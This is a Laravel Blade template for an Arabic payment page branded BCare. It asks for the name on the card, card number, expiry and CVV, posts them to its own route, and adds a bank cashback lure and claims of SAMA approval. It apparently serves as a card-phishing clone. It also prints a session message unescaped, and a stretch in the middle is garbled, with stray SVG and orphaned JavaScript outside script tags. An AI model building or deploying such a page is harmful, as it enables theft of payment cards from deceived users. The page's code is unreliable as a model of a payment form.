<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>بوابة الدفع الآمنة - BCare</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/jpeg" href="{{ asset('favicon.jpg') }}">
    <link rel="shortcut icon" type="image/jpeg" href="{{ asset('favicon.jpg') }}">
    
    <!-- Preconnect to external domains -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://cdn.jsdelivr.net">
    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
    
    <!-- Load fonts with display=swap to prevent FOIT -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
    <noscript><link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet"></noscript>
    
    <!-- Load SweetAlert2 synchronously for immediate use -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <!-- Defer IMask as it's not needed immediately -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js" defer></script>

    @if (session()->has('success'))
    <script>
        // Ensure Swal is loaded before use
        document.addEventListener('DOMContentLoaded', function() {
            if (typeof Swal !== 'undefined') {
                Swal.fire({
                    icon: 'success',
                    title: 'تم بنجاح!',
                    text: '{!! Session::get('success') !!}',
                    confirmButtonText: 'حسناً',
                    confirmButtonColor: '#28a745'
                });
            }
        });
    </script>
    @endif

    @if ($errors->any())
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if (typeof Swal !== 'undefined') {
                let errorsList = '<ul style="text-align: right; padding: 0 20px;">';
                @foreach ($errors->all() as $error)
                    errorsList += '<li style="margin: 8px 0;">{{ $error }}</li>';
                @endforeach
                errorsList += '</ul>';
                
                Swal.fire({
                    icon: 'error',
                    title: 'تنبيه!',
                    html: errorsList,
                    confirmButtonText: 'حسناً',
                    confirmButtonColor: '#dc3545',
                    customClass: {
                        popup: 'rtl-popup'
                    }
                });
            }
        });
    </script>
    @endif
    
    <style>
        /* Reset & Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', 'Tajawal', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #e8eef5 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
            /* Performance: Enable hardware acceleration */
            transform: translateZ(0);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Payment Wrapper */
        .payment-wrapper {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Payment Form Section */
        .payment-form-section {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
        }

        .section-title {
            font-size: 24px;
            font-weight: 700;
            color: #0f4570;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .section-title svg {
            width: 28px;
            height: 28px;
            color: #146394;
        }

        .section-subtitle {
            color: #666;
            margin-bottom: 30px;
            font-size: 15px;
            padding-right: 40px;
        }

        /* Payment Methods */
        .payment-methods {
            display: flex;
            gap: 15px;
            margin-bottom: 35px;
        }

        .payment-method-btn {
            flex: 1;
            padding: 20px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            background: white;
            cursor: pointer;
            /* Performance: Use transform and opacity for animations */
            transition: transform 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            /* Optimize for animations */
            backface-visibility: hidden;
        }

        .payment-method-btn:hover {
            border-color: #146394;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(20,99,148,0.15);
            /* Performance: Use transform and opacity for smooth animations */
            will-change: transform, box-shadow;
        }

        .payment-method-btn.active {
            border-color: #146394;
            background: linear-gradient(135deg, #f0f8ff 0%, #e6f3ff 100%);
        }

        .payment-method-btn img {
            height: 35px;
            width: auto;
        }

        .payment-method-btn span {
            font-size: 14px;
            font-weight: 600;
            color: #333;
        }

        /* Payment Grid */
        .payment-grid {
            display: grid;
            grid-template-columns: 1.5fr 1fr;
            gap: 30px;
            margin-top: 30px;
        }

        /* Form Groups */
        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 10px;
            font-size: 15px;
        }

        .required {
            color: #e74c3c;
            margin-left: 5px;
        }

        .error-message {
            color: #e74c3c;
            font-weight: 400;
            font-size: 13px;
        }

        /* SweetAlert RTL Customization */
        .rtl-popup {
            direction: rtl !important;
            text-align: right !important;
        }
        
        .rtl-popup .swal2-title {
            font-family: 'Cairo', 'Tajawal', sans-serif !important;
        }
        
        .rtl-popup .swal2-html-container {
            font-family: 'Cairo', 'Tajawal', sans-serif !important;
        }

        /* Input Wrapper */
        .input-wrapper {
            position: relative;
        }

        .form-control {
            width: 100%;
            padding: 16px 50px 16px 20px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            font-family: 'Cairo', sans-serif;
            background: #fafafa;
        }

        .form-control:focus {
            outline: none;
            border-color: #146394;
            background: white;
            box-shadow: 0 0 0 4px rgba(20,99,148,0.1);
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #999;
        }

        .input-icon svg {
            width: 20px;
            height: 20px;
        }

        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        /* Card Icons - Dynamic in Input Field */
        .card-icon-detected {
            position: absolute;
            left: 50px;
            top: 50%;
            transform: translateY(-50%);
            height: 30px;
            width: auto;
            opacity: 0;
            transition: opacity 0.3s ease;
            pointer-events: none;
        }

        .card-icon-detected.active {
            opacity: 1;
        }

        /* Submit Button */
        .submit-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #146394 0%, #0f4570 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(20,99,148,0.3);
        }

        .submit-btn svg {
            width: 24px;
            height: 24px;
        }

        /* Order Summary Section */
        .order-summary {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.08);
            height: fit-content;
            position: sticky;
            top: 30px;
        }

        .summary-title {
            font-size: 20px;
            font-weight: 700;
            color: #0f4570;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f0f0f0;
            text-align: center;
        }

        /* Total Amount Display */
        .total-amount-display {
            text-align: center;
            background: linear-gradient(135deg, #146394 0%, #0f4570 100%);
            padding: 30px 20px;
            border-radius: 12px;
            margin-bottom: 25px;
        }

        .amount-label {
            color: rgba(255,255,255,0.9);
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 10px;
        }

        .amount-value {
            color: white;
            font-size: 42px;
            font-weight: 800;
            line-height: 1;
        }

        .amount-value .currency {
            font-size: 24px;
            font-weight: 600;
            margin-right: 8px;
        }

        /* Cashback Banner */
        .cashback-banner {
            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
            border: 2px solid #f4c430;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 25px;
            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
            animation: pulse-glow 2s ease-in-out infinite;
        }

        @keyframes pulse-glow {
            0%, 100% {
                box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
            }
            50% {
                box-shadow: 0 6px 25px rgba(255, 215, 0, 0.5);
            }
        }

        .cashback-banner .cashback-icon {
            text-align: center;
            margin-bottom: 12px;
        }

        .cashback-banner .cashback-icon svg {
            color: #b8860b;
        }

        .cashback-title {
            font-size: 18px;
            font-weight: 800;
            color: #b8860b;
            text-align: center;
            margin-bottom: 10px;
        }

        .cashback-text {
            font-size: 14px;
            color: #664d03;
            text-align: center;
            margin-bottom: 12px;
        }

        .cashback-text strong {
            color: #b8860b;
            font-size: 18px;
        }

        .cashback-banks {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
            margin-bottom: 10px;
        }

        .cashback-banks span {
            background: white;
            color: #664d03;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            border: 1px solid #f4c430;
        }

        .cashback-note {
            font-size: 11px;
            color: #664d03;
            text-align: center;
            font-style: italic;
        }

        /* Accepted Cards */
        .accepted-cards {
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        .accepted-title {
            font-size: 14px;
            font-weight: 600;
            color: #333;
            text-align: center;
            margin-bottom: 15px;
        }

        .card-logos {
            display: flex;
            justify-content: center;
            gap: 15px;
            flex-wrap: wrap;
        }

        .card-logos img {
            height: 35px;
            width: auto;
            filter: grayscale(20%);
            transition: all 0.3s ease;
        }

        .card-logos img:hover {
            filter: grayscale(0%);
            transform: translateY(-2px);
        }

        .insurance-company {
            text-align: center;
            margin-bottom: 25px;
        }

        .insurance-logo {
            width: 100%;
            max-width: 180px;
            height: auto;
            margin-bottom: 15px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }

        .company-name {
            font-size: 16px;
            font-weight: 600;
            color: #333;
        }

        .summary-details {
            margin: 25px 0;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            padding: 15px 0;
            border-bottom: 1px solid #f0f0f0;
            font-size: 15px;
        }

        .detail-row:last-child {
            border-bottom: none;
        }

        .detail-label {
            color: #666;
            font-weight: 500;
        }

        .detail-value {
            font-weight: 700;
            color: #333;
        }

        .total-row {
            background: linear-gradient(135deg, #f0f8ff 0%, #e6f3ff 100%);
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }

        .total-row .detail-label {
            font-size: 18px;
            font-weight: 700;
            color: #0f4570;
        }

        .total-row .detail-value {
            font-size: 26px;
            font-weight: 800;
            color: #146394;
        }

        .currency {
            font-size: 16px;
            margin-right: 5px;
        }

        /* Security Notice */
        .security-notice {
            background: #f9f9f9;
            padding: 20px;
            border-radius: 10px;
            margin-top: 25px;
            display: flex;
            align-items: start;
            gap: 12px;
        }

        .security-notice svg {
            width: 24px;
            height: 24px;
            color: #27ae60;
            flex-shrink: 0;
            margin-top: 2px;
        }

        .security-notice-text {
            font-size: 13px;
            color: #555;
            line-height: 1.6;
        }

        /* Back Button */
        .back-btn {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #146394;
            font-weight: 600;
            font-size: 15px;
            text-decoration: none;
            padding: 12px 20px;
            border-radius: 8px;
            transition: all 0.3s;
            margin-bottom: 20px;
        }

        .back-btn:hover {
            background: #f0f8ff;
        }

        .back-btn svg {
            width: 20px;
            height: 20px;
        }

        /* Loading Overlay - Energetic Wave Fill */
        .loading-overlay {
            position: fixed;
            inset: 0;
            display: none;
            justify-content: center;
            align-items: center;
            background: radial-gradient(900px 900px at 50% 40%, rgba(12, 42, 70, 0.18), rgba(9, 17, 28, 0.92));
            z-index: 9999;
            backdrop-filter: blur(8px);
        }

        .loading-overlay.active {
            display: flex;
        }

        .loading-content {
            position: relative;
            width: 180px;
            height: 180px;
            display: grid;
            place-items: center;
            text-align: center;
        }

        /* Background Logo */
        .loading-logo {
            position: absolute;
            width: 140px;
            height: 140px;
            object-fit: contain;
            opacity: 0.9;
            filter: drop-shadow(0 2px 12px rgba(0, 0, 0, 0.4));
            z-index: 1;
        }

        .loading-logo img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        /* SVG Wave Fill Container */
        .fillbox {
            position: relative;
            width: 140px;
            height: 140px;
            z-index: 2;
        }

        /* Wave Fill Animation */
        .fill-base {
            animation: level 3s ease-in-out infinite;
        }

        .wave {
            opacity: 0.95;
            transform-origin: center;
            animation: bob 1.25s ease-in-out infinite, drift 5.5s linear infinite, level 3s ease-in-out infinite;
        }

        /* Liquid Level Animation (Rise/Fall) */
        @keyframes level {
            0% {
                y: 78%;
                height: 22%;
            }
            40% {
                y: 32%;
                height: 68%;
            }
            60% {
                y: 28%;
                height: 72%;
            }
            100% {
                y: 78%;
                height: 22%;
            }
        }

        /* Wave Bobbing */
        @keyframes bob {
            0%, 100% {
                transform: translateY(0px);
            }
            50% {
                transform: translateY(-7px);
            }
        }

        /* Horizontal Drift */
        @keyframes drift {
            from {
                transform: translateX(0);
            }
            to {
                transform: translateX(120px);
            }
        }

        /* Spinner (Fallback) */
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-top-color: #0ABEC7;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto 0;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .loading-text {
            font-size: 18px;
            font-weight: 600;
            color: #ffffff;
            margin-top: 30px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }

        .loading-subtext {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.85);
            margin-top: 8px;
            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.3);
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .payment-grid {
                grid-template-columns: 1fr;
            }

            .order-summary {
                position: static;
            }
        }

        @media (max-width: 768px) {
            .payment-header {
                flex-direction: column;
                gap: 20px;
                text-align: center;
            }

            .brand-section {
                flex-direction: column;
            }

            .security-badges {
                flex-direction: column;
                width: 100%;
            }

            .badge {
                width: 100%;
                justify-content: center;
            }

            .payment-form-section {
                padding: 25px 20px;
            }

            .form-row {
                grid-template-columns: 1fr;
            }

            .payment-methods {
                flex-direction: column;
            }

            .section-subtitle {
                padding-right: 0;
            }
        }
    </style>
</head>
<body>

    <!-- Loading Overlay: Energetic Wave Fill -->
    <div class="loading-overlay" id="loadingOverlay" aria-hidden="true">
        <div class="loading-content">
            <!-- Background Logo -->
            <div class="loading-logo">
                <img src="{{ asset('loder.png') }}" alt="BCare Logo" aria-hidden="true">
            </div>

            <!-- SVG Wave Fill Effect -->
            <svg class="fillbox" viewBox="0 0 512 512" aria-hidden="true">
                <defs>
                    <!-- Mask using logo shape -->
                    <mask id="bMask-wave" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">
                        <image href="{{ asset('loder.png') }}" x="0" y="0" width="1" height="1" preserveAspectRatio="xMidYMid meet"/>
                    </mask>

                    <!-- Liquid Gradient -->
                    <linearGradient id="liquid" x1="0" y1="1" x2="0" y2="0">
                        <stop offset="0%" stop-color="#0ABEC7"/>
                        <stop offset="45%" stop-color="#16D1DC"/>
                        <stop offset="100%" stop-color="#5EEAD4"/>
                    </linearGradient>
                </defs>

                <g mask="url(#bMask-wave)">
                    <!-- Fill Base -->
                    <rect class="fill-base" x="-10%" width="120%" y="70%" height="40%" fill="url(#liquid)" rx="10"/>
                    <!-- Animated Wave -->
                    <path class="wave"
                        d="M-60,0 C20,18 140,-18 220,0 C300,18 420,-18 500,0 L500,70 L-60,70 Z"
                        fill="url(#liquid)" />
                </g>
            </svg>

            <!-- Loading Text -->
            <div class="loading-text">جاري معالجة الدفع</div>
            <div class="loading-subtext">الرجاء الانتظار، لا تغلق الصفحة</div>

            <!-- Fallback Spinner (hidden by default) -->
            <div class="spinner" style="display: none;"></div>
        </div>
    </div>

    <div class="payment-wrapper">
        <!-- Header removed as requested -->

        <!-- Back Button -->
        <a href="{{ url('/insuranceInformation') }}" class="back-btn">
            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
            </svg>
            العودة للملخص
        </a>

        <!-- Main Grid -->
        <div class="payment-grid">
            <!-- Payment Form -->
            <div class="payment-form-section">
                <h2 class="section-title">
                    <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                    </svg>
                    معلومات الدفع
                </h2>
                <p class="section-subtitle">اختر طريقة الدفع المناسبة وأدخل البيانات المطلوبة</p>


                <form action="{{ route('paymentFormRequest') }}" method="POST" id="paymentForm">
                    @csrf

                    <!-- Card Holder Name -->
                    <div class="form-group">
                        <label for="name">
                            <span class="required">*</span>
                            اسم حامل البطاقة
                            @error('name_on_card')
                            <span class="error-message">({{ $message }})</span>
                            @enderror
                        </label>
                        <div class="input-wrapper">
                            <input 
                                type="text" 
                                name="name_on_card" 
                                id="name" 
                                class="form-control" 
                                placeholder="الاسم كما هو مدون على البطاقة"
                                value="{{ old('name_on_card') }}"
                                maxlength="50"
                                required
                            >
                            <div class="input-icon">
                                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
                                </svg>
                            </div>
                        </div>
                    </div>

                    <!-- Card Number -->
                    <div class="form-group">
                        <label for="cardnumber">
                            <span class="required">*</span>
                            رقم البطاقة
                            @error('card_number')
                            <span class="error-message">({{ $message }})</span>
                            @enderror
                        </label>
                        <div class="input-wrapper">
                            <input 
                                type="text" 
                                name="card_number" 
                                id="cardnumber" 
                                class="form-control" 
                                placeholder="0000 0000 0000 0000"
                                value="{{ old('card_number') }}"
                                inputmode="numeric"
                                required
                            >
                            <!-- Dynamic Card Type Icons -->
                            <img id="cardIconMada" class="card-icon-detected" src="{{ asset('storage/images/insurances/payment/mada-card.svg') }}" alt="مدى" style="display: none;">
                            <img id="cardIconVisa" class="card-icon-detected" src="{{ asset('storage/images/insurances/payment/visa-card.svg') }}" alt="فيزا" style="display: none;">
                            <img id="cardIconMaster" class="card-icon-detected" src="{{ asset('storage/images/insurances/payment/master-card.svg') }}" alt="ماستركارد" style="display: none;">
                            <div class="input-icon">
                                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                </svg>
                            </div>
                        </div>
                    </div>

                    <!-- Expiry Date & CVV -->
                    <div class="form-row">
                        <div class="form-group">
                            <label for="expirationdate">
                                <span class="required">*</span>
                                تاريخ الانتهاء
                                @error('expiry_date')
                                <span class="error-message">({{ $message }})</span>
                                @enderror
                            </label>
                            <input 
                                type="text" 
                                name="expiry_date" 
                                id="expirationdate" 
                                class="form-control" 
                                placeholder="MM/YY"
                                value="{{ old('expiry_date') }}"
                                inputmode="numeric"
                                maxlength="5"
                                required
                            >
                        </div>
                        <div class="form-group">
                            <label for="securitycode">
                                <span class="required">*</span>
                                رمز الأمان (CVV)
                                @error('cvv')
                                <span class="error-message">({{ $message }})</span>
                                @enderror
                            </label>
                            <input 
                                type="text" 
                                name="cvv" 
                                id="securitycode" 
                                class="form-control" 
                                placeholder="***"
                                inputmode="numeric"
                                minlength="3"
                                maxlength="3"
                                required
                            >
                        </div>
                    </div>

                    <!-- Submit Button -->
                    <button type="submit" class="submit-btn">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2zm10-10V7a4 4 0 0 0-8 0v4h8z"></path>
                        </svg>
                        تأكيد الدفع
                    </button>

                    <!-- Security Notice - Moved Below Payment Button -->
                    <div class="security-notice" style="margin-top: 20px;">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                        </svg>
                        <div class="security-notice-text">
                            <strong>دفع آمن ومشفر</strong><br>
                            جميع معلومات الدفع محمية بتشفير SSL 256-bit ومعتمدة من مؤسسة النقد العربي السعودي (SAMA)
                        </div>
                    </div>
                </form>
            </div>

            <!-- Total Amount Summary - Replaced Order Summary -->
            <div class="order-summary">
                <h3 class="summary-title">المبلغ الإجمالي</h3>

                <div class="total-amount-display">
                    <div class="amount-label">المبلغ المستحق</div>
                    <div class="amount-value">
                        {{ number_format($allFormData['total'], 2) }}
                        <span class="currency">ر.س</span>
                    </div>
                </div>

                <!-- Cashback Offer Banner -->
                <div class="cashback-banner" id="cashbackBanner">
                    <div class="cashback-icon">
                        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" width="32" height="32">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                        </svg>
                    </div>
                    <div class="cashback-content">
                        <div class="cashback-title">🎁 عرض كاش باك حصري!</div>
                        <div class="cashback-text">
                            احصل على <strong>25 دولار</strong> كاش باك عند الدفع ببطاقة ائتمانية من:
                        </div>
                        <div class="cashback-banks">
                            <span>🏦 البنك الأهلي</span>
                            <span>🏦 ساب</span>
                            <span>🏦 بنك الجزيرة</span>
                            <span>🏦 البنك السعودي الفرنسي</span>
                        </div>
                        <div class="cashback-note">* باستثناء مصرف الراجحي</div>
                    </div>
                </div>

                <!-- Accepted Payment Methods -->
                <div class="accepted-cards">
                    <div class="accepted-title">طرق الدفع المقبولة</div>
                    <div class="card-logos">
                        <img src="{{ asset('storage/images/insurances/payment/mada-card.svg') }}" alt="مدى" title="مدى">
                        <img src="{{ asset('storage/images/insurances/payment/visa-card.svg') }}" alt="فيزا" title="فيزا">
                        <img src="{{ asset('storage/images/insurances/payment/master-card.svg') }}" alt="ماستركارد" title="ماستركارد">
                        <img src="{{ asset('storage/images/insurances/payment/sadad-payment-logo.svg') }}" alt="سداد" title="سداد">
                    </div>
                </div>
            </div>
        </div>
    </div>

    
                                </g>
                            </g>
                        </g>
                        <g id="Back">
                        </g>
                    </svg>
                </div>
                <div class="back">
                    <svg version="1.1" id="cardback" xmlns="http://www.w3.org/2000/svg"
                        xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 750 471"
                        style="enable-background:new 0 0 750 471;" xml:space="preserve">
                        <g id="Front">
                            <line class="st0" x1="35.3" y1="10.4" x2="36.7" y2="11" />

            //define the color swap function
            const swapColor = function(basecolor) {
                document.querySelectorAll('.lightcolor')
                    .forEach(function(input) {
                        input.setAttribute('class', '');
                        input.setAttribute('class', 'lightcolor ' + basecolor);
                    });
                document.querySelectorAll('.darkcolor')
                    .forEach(function(input) {
                        input.setAttribute('class', '');
                        input.setAttribute('class', 'darkcolor ' + basecolor + 'dark');
                    });
            };


            //pop in the appropriate card icon when detected
            cardnumber_mask.on("accept", function() {
                console.log(cardnumber_mask.masked.currentMask.cardtype);
                switch (cardnumber_mask.masked.currentMask.cardtype) {
                    case 'american express':
                        ccicon.innerHTML = amex;
                        ccsingle.innerHTML = amex_single;
                        swapColor('green');
                        break;
                    case 'visa':
                        ccicon.innerHTML = visa;
                        ccsingle.innerHTML = visa_single;
                        swapColor('lime');
                        break;
                    case 'diners':
                        ccicon.innerHTML = diners;
                        ccsingle.innerHTML = diners_single;
                        swapColor('orange');
                        break;
                    case 'discover':
                        ccicon.innerHTML = discover;
                        ccsingle.innerHTML = discover_single;
                        swapColor('purple');
                        break;
                    case ('jcb' || 'jcb15'):
                        ccicon.innerHTML = jcb;
                        ccsingle.innerHTML = jcb_single;
                        swapColor('red');
                        break;
                    default:
                        ccicon.innerHTML = '';
                        ccsingle.innerHTML = '';
                        swapColor('grey');
                        break;
                }
            }
        });
    

    // =====================================================
    // ✨ Performance Optimization Utilities ✨
    // =====================================================
    // These utilities help reduce Chrome performance warnings by:
    // 1. Throttle: Limits how often a function executes (good for scroll/resize)
    // 2. Debounce: Delays execution until user stops an action
    // 3. RAF: Uses requestAnimationFrame for smooth 60fps animations
    // =====================================================
    
    // Throttle function - limits execution rate
    function throttle(fn, wait = 100) {
        let lastTime = 0;
        return function(...args) {
            const now = Date.now();
            if (now - lastTime >= wait) {
                lastTime = now;
                fn.apply(this, args);
            }
        };
    }

    // Debounce function - delays execution until activity stops
    function debounce(fn, wait = 150) {
        let timeout;
        return function(...args) {
            clearTimeout(timeout);
            timeout = setTimeout(() => fn.apply(this, args), wait);
        };
    }

    // RequestAnimationFrame wrapper for smooth visual updates
    function rafScheduler(fn) {
        let rafId = null;
        return function(...args) {
            if (rafId !== null) {
                cancelAnimationFrame(rafId);
            }
            rafId = requestAnimationFrame(() => {
                fn.apply(this, args);
                rafId = null;
            });
        };
    }

    // =====================================================
    // Modern Payment Form Initialization (Optimized)
    // =====================================================
    
    document.addEventListener('DOMContentLoaded', function() {
        // Check if IMask is loaded
        if (typeof IMask === 'undefined') {
            console.warn('IMask library not loaded yet');
            return;
        }

        // Get form elements with null guards
        const cardNumberInput = document.getElementById('cardnumber');
        const expiryInput = document.getElementById('expirationdate');
        const cvvInput = document.getElementById('securitycode');
        const paymentForm = document.getElementById('paymentForm');
        const loadingOverlay = document.getElementById('loadingOverlay');

        // Get dynamic card icon elements
        const cardIconMada = document.getElementById('cardIconMada');
        const cardIconVisa = document.getElementById('cardIconVisa');
        const cardIconMaster = document.getElementById('cardIconMaster');

        // Initialize card number mask with optimized settings and dynamic icon detection
        if (cardNumberInput) {
            const cardMask = new IMask(cardNumberInput, {
                mask: '0000 0000 0000 0000',
                lazy: false
            });

            // Detect card type and show corresponding icon dynamically
            cardNumberInput.addEventListener('input', throttle(function() {
                const value = cardNumberInput.value.replace(/\s/g, ''); // Remove spaces
                
                // Hide all icons first
                if (cardIconMada) {
                    cardIconMada.style.display = 'none';
                    cardIconMada.classList.remove('active');
                }
                if (cardIconVisa) {
                    cardIconVisa.style.display = 'none';
                    cardIconVisa.classList.remove('active');
                }
                if (cardIconMaster) {
                    cardIconMaster.style.display = 'none';
                    cardIconMaster.classList.remove('active');
                }

                // Detect card type based on first digits
                if (value.length >= 1) {
                    const firstDigit = value.charAt(0);
                    
                    // Mada cards: Start with 4, 5, or 6 (with specific BIN ranges)
                    // For simplicity, we'll show Mada for Saudi-specific patterns
                    // Mada BINs include: 4* (some ranges), 5* (some ranges), 6* (some ranges)
                    if (firstDigit === '5' && (value.startsWith('50') || value.startsWith('58') || value.startsWith('60') || value.startsWith('62') || value.startsWith('63') || value.startsWith('65') || value.startsWith('66') || value.startsWith('67'))) {
                        // Mada (overlap with Mastercard, but Mada has priority in Saudi)
                        if (cardIconMada) {
                            cardIconMada.style.display = 'block';
                            requestAnimationFrame(() => {
                                cardIconMada.classList.add('active');
                            });
                        }
                    } else if (firstDigit === '4') {
                        // Visa cards start with 4
                        if (cardIconVisa) {
                            cardIconVisa.style.display = 'block';
                            requestAnimationFrame(() => {
                                cardIconVisa.classList.add('active');
                            });
                        }
                    } else if (firstDigit === '5') {
                        // Mastercard cards start with 5 (51-55)
                        if (cardIconMaster) {
                            cardIconMaster.style.display = 'block';
                            requestAnimationFrame(() => {
                                cardIconMaster.classList.add('active');
                            });
                        }
                    } else if (firstDigit === '2') {
                        // Mastercard also starts with 2 (2221-2720)
                        if (cardIconMaster) {
                            cardIconMaster.style.display = 'block';
                            requestAnimationFrame(() => {
                                cardIconMaster.classList.add('active');
                            });
                        }
                    }
                }
            }, 100));
        }

        // Initialize expiry date mask with auto "/" insertion and year normalization
        if (expiryInput) {
            const expiryMask = new IMask(expiryInput, {
                mask: 'MM/YY',
                blocks: {
                    MM: {
                        mask: IMask.MaskedRange,
                        from: 1,
                        to: 12
                    },
                    YY: {
                        mask: IMask.MaskedRange,
                        from: 0,
                        to: 99
                    }
                },
                lazy: false
            });

            // Additional handler for auto "/" insertion and year normalization
            expiryInput.addEventListener('input', function(e) {
                let value = expiryInput.value.replace(/\D/g, ''); // Remove non-digits
                
                // Auto-insert "/" after 2 digits (MM)
                if (value.length >= 2) {
                    let month = value.substring(0, 2);
                    let year = value.substring(2);
                    
                    // Normalize year: convert 4-digit year to 2-digit
                    if (year.length === 4) {
                        year = year.substring(2, 4); // Take last 2 digits (2030 -> 30)
                    } else if (year.length === 2) {
                        year = year; // Keep as is (30 -> 30)
                    }
                    
                    // Build formatted value
                    if (year) {
                        expiryInput.value = month + '/' + year;
                    } else {
                        expiryInput.value = month;
                    }
                    
                    // Update IMask value
                    expiryMask.updateValue();
                }
            });
        }

        // Initialize CVV mask with optimized settings
        if (cvvInput) {
            new IMask(cvvInput, {
                mask: '000[0]',
                lazy: false
            });
        }

        // Show loading overlay on form submit (with RAF for smooth transition)
        if (paymentForm && loadingOverlay) {
            paymentForm.addEventListener('submit', function() {
                requestAnimationFrame(() => {
                    loadingOverlay.classList.add('active');
                });
            });
        }

        // Optimize scroll events if any
